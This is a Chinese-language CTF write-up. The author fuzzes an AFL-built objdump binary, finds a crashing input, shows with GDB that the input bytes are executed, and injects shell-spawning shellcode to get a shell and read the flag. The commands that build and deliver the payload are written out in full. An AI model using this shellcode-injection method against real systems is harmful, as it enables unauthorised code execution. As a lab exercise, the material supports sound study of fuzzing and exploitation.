## fzuu

简单读一下 AFL 的 [README](https://github.com/google/AFL)，了解到跑 fuzz 测试的流程如下：

1. 用 `afl-gcc` 编译程序（题目已经给了编译好的 `objdump_afl`）；
2. 设置初始 test case，作用相当于随机化的种子（题目给的 `fuzz_in/` 目录就是，直接用）；
3. 运行 `afl-fuzz` 跑测试。

前两步都不用自己做。直接本地安装并运行 `afl-fuzz` 跑测试：

```
$ afl-fuzz -i fuzz_in -o output ./objdump_afl -d @@ 
```

会有个好看的 TUI 显示现在触发了多少 crash 之类的。发现出现 crash 后，就可以到 `output/crashes` 里面看 payload 了。我大概跑了20分钟，就得到4个触发 crash 的 test case 了。

随便找一个 test case 看看咋回事：

```
$ xxd output/crashes/id:000000,sig:04,src:000065,op:havoc,rep:16
00000000: 5331 3030 1f1f 1f1f 1f1f 1f1f 1f1f 051f  S100............
00000010: 1f35 3043 301f 1f1f 1f1f 1f1f 1f1f 1f1f  .50C0...........
00000020: 1f1f 0010 1f0c 1f1f 1f1f 1f1f 1f1f 1f1f  ................
00000030: 1f1f 3530 3830 1f3f 1f1f 1f1f 1f1f 1f1f  ..5080.?........
00000040: 1f1f 1f1f 1f1f 1f1f 1f1f 3530 3830 1f3f  ..........5080.?
00000050: 1f1f 1f1f 1f1f 1f1f 011f 1b10 1f1f 1f1f  ................
00000060: 2a1f 1f35 ff80 30                        *..5..0
$ ./objdump -d output/crashes/id:000000,sig:04,src:000065,op:havoc,rep:16
zsh: illegal hardware instruction (core dumped)
```

这个 `illegal hardware instruction` 很有提示性，很可能是注入的 payload 被执行了。开 GDB 看一看就知道了：

```
(gdb) run -d output/crashes/id:000000,sig:04,src:000065,op:havoc,rep:16
Program received signal SIGILL, Illegal instruction.
0x00007fffffffdb80 in ?? ()
(gdb) x/32bx $rip - 8
0x7fffffffdb78: 0x80    0xdb    0xff    0xff    0xff    0x7f    0x00    0x00
0x7fffffffdb80: 0x1f    0x1f    0x1f    0x1f    0x1f    0x1f    0x1f    0x1f
0x7fffffffdb88: 0x05    0x1f    0x1f    0x35    0x30    0x43    0x30    0x1f
0x7fffffffdb90: 0x1f    0x1f    0x1f    0x1f    0x1f    0x1f    0x1f    0x1f
```

这里可以看到 0x7fffffffdb80 开始的部分是输入 payload 从 byte #7 往后的内容。也就是说 payload byte #7 后面的部分会被当成指令执行。把只读文件系统那题里写的拿 shell 的 shellcode 填进去，就能拿 shell 了：

```
$ gcc shellcode.s
$ objdump --disassemble=main a.out
0000000000001119 <main>:
    1119:       66 6a 68                pushw  $0x6
......
    113a:       0f 05                   syscall 
    113c:       0f 1f 40 00             nopl   0x0(%rax)
$ (printf 'S100\x1f\x1f'; dd if=a.out ibs=1 skip=$((0x1119)) count=$((0x113c-0x1119))) > payload
$ ./objdump -d payload
sh-5.1$ # 拿到 shell
```

网页终端里输入 base64 编码的 payload，`ls` 可以看到当前目录下有个 `flag.txt`，完成。

感觉这题没啥难度啊，不知道为啥做的人很少。

